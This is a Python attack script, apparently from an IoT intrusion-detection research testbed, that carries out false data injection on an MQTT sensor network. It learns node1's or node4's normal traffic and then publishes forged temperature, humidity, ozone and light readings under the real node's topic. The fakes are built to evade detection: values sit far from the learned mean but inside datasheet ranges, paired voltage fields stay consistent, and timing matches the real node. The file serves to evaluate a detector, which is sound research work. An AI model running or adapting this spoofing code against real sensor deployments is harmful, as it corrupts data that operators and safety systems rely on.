"""
=========================================================
ATTACK: FALSE DATA INJECTION
=========================================================
Methodology Section 3.2.2 / Table 1:
  Transmission of incorrect sensor readings.
  Expected: D significantly affected (High risk)

Only SENSOR fields are perturbed (node1: temp, humidity, ozone, ozone_v;
node4: temp, humidity, light, light_v - AHT20 plus LDR). The set is
resolved from the target topic via payloads.NODE_SCHEMAS, so injecting
into node4 perturbs node4's readings. Communication fields (ip, rssi, shared state, network alerts)
stay statistically normal so the attack is not trivially detectable by
payload schema or packet size.
"""

import os
import time
import random
from adaptive_learner import learn_network, make_client
import payloads

# =========================
# CONFIG
# =========================
BROKER           = os.environ.get("MQTT_BROKER", "localhost")
PORT             = 1883
USER             = "esp32user"
PASSWORD         = os.environ.get("MQTT_PASS", "")
TARGET_TOPIC     = "iot/node1/data"
ATTACKER_ID      = "attacker_fdi_py"
LEARN_DURATION   = 60
SIGMA_MULTIPLIER = 6   # how many std-devs away from learned mean

# Per-field minimum sigma, in each field's OWN unit.
#
# This replaces a single unit-blind floor of 0.5 that was previously applied to
# every sensor field. That floor was sized for degrees Celsius and silently
# reused for voltages: on ozone_v, whose true baseline std is 0.0065 V, it
# inflated sigma to 0.5 and produced a +/-5.0 V excursion against a 0.23-0.26 V
# baseline. That is roughly twenty times the sensor's full output span, so the
# injected value was not a plausible forgery but an impossible one, and a
# deterministic range check rejected it with no statistical model involved.
#
# The floors below are each sensor's own quantisation, matching
# TinyML.SENSOR_FLOOR. Anything at or below the reporting resolution cannot be
# distinguished from noise and is not a meaningful thing to forge.
SIGMA_FLOOR = {
    "temp": 1.0,        # DHT11, 1 deg C
    "humidity": 2.0,    # DHT11, 2 %RH
    "ozone": 12.0,      # MQ-131 12-bit ADC
    "ozone_v": 0.01,
    "light": 12.0,      # LDR via 12-bit ADC
    "light_v": 0.01,
    "sound": 12.0,      # ESP32 12-bit ADC
    "sound_v": 0.01,
    "distance": 1.0,    # HC-SR04 +/-1 cm, within the 5..400 window
    "reed_ao": 3.0,     # ATmega328P 10-bit ADC (0..1023), ~3 LSB
}

# Fields that carry real sensor data (perturbed by FDI), per node.
# Resolved from the target topic at run time via payloads.NODE_SCHEMAS;
# this is only the node1 default.
SENSOR_FIELDS = payloads.sensor_fields_for("node1")


def fabricate_value(profile, field, default, node_id=None):
    """Forge a sensor value that is ANOMALOUS BUT PHYSICALLY REALISABLE.

    The value is drawn SIGMA_MULTIPLIER sigma from the learned mean and then
    clamped to the sensor's datasheet range (payloads.SENSOR_RANGES). Clamping
    is what makes this the interesting attack: every injected reading is
    individually defensible, so a range or plausibility check cannot reject it
    and only a model that has learned the joint behaviour of the fields can.
    """
    stats = profile.field_stats.get(field)
    rng = payloads.sensor_range(node_id, field)
    if not stats:
        return default

    mean = stats['mean']
    std = max(stats['std'], SIGMA_FLOOR.get(field, 0.0))
    direction = random.choice([-1, 1])
    value = mean + direction * SIGMA_MULTIPLIER * std

    if rng is not None:
        low, high = rng
        # Clamp inside the range, not to its edge: a value pinned exactly at
        # the datasheet limit is as implausible as one beyond it, and would
        # reintroduce the artefact this clamp exists to remove.
        span = high - low
        value = min(max(value, low + 0.02 * span), high - 0.02 * span)

    return round(value, 2)


def run(profile, broker=BROKER, port=PORT, user=USER, password=PASSWORD,
        target_topic=TARGET_TOPIC, duration=None, stop_event=None,
        on_publish=None, captured=None):
    """Publish node1-identical payloads with sensor values shifted ~10 sigma.

    Returns the number of messages published.
    """
    client = make_client(ATTACKER_ID)
    client.username_pw_set(user, password)
    client.connect(broker, port, 60)
    client.loop_start()

    node_id = payloads.node_from_topic(target_topic)
    schema = payloads.schema_for(node_id)
    sensor_fields = schema["sensor_fields"]
    defaults = schema["defaults"]
    int_fields = schema["int_fields"]

    interval = max(0.1, profile.interval_mean)
    count = 0
    end = time.time() + duration if duration else None
    try:
        while True:
            if stop_event is not None and stop_event.is_set():
                break
            if end is not None and time.time() >= end:
                break
            # Forge each raw sensor field once, then derive the voltage fields
            # from their parents so the payload satisfies the same identity the
            # firmware does. Forging ozone and ozone_v independently would make
            # the pair self-contradictory and trivially detectable.
            forged = {f: fabricate_value(profile, f, defaults[f], node_id)
                      for f in sensor_fields}
            for derived, parent in payloads.DERIVED_FIELDS.get(
                    node_id, {}).items():
                if parent in forged and derived in sensor_fields:
                    value = payloads.derived_value(node_id, derived,
                                                   forged[parent])
                    if value is not None:
                        forged[derived] = value

            overrides = {}
            for field in sensor_fields:
                value = forged[field]
                if field in int_fields:
                    value = int(round(value))
                overrides[field] = value
            payload = payloads.build_payload(profile, overrides, node_id=node_id)
            client.publish(target_topic, payload)
            count += 1
            if on_publish:
                on_publish(payload)
            time.sleep(interval)
    except KeyboardInterrupt:
        pass
    finally:
        client.loop_stop()
        client.disconnect()
    return count


def main():
    print("=== FALSE DATA INJECTION ATTACK (adaptive) ===")
    print(f"Target: {TARGET_TOPIC}")
    print(f"Sigma multiplier: {SIGMA_MULTIPLIER}\n")

    profile = learn_network(BROKER, PORT, USER, PASSWORD,
                             TARGET_TOPIC, learn_duration=LEARN_DURATION)

    print(f"\n=== ATTACK ACTIVE — interval {profile.interval_mean:.2f}s (matches baseline) ===")
    print("Only D should degrade — F, T, P stay normal\n")
    run(profile, on_publish=lambda m: print(f"[fdi] {m}"))


if __name__ == "__main__":
    main()
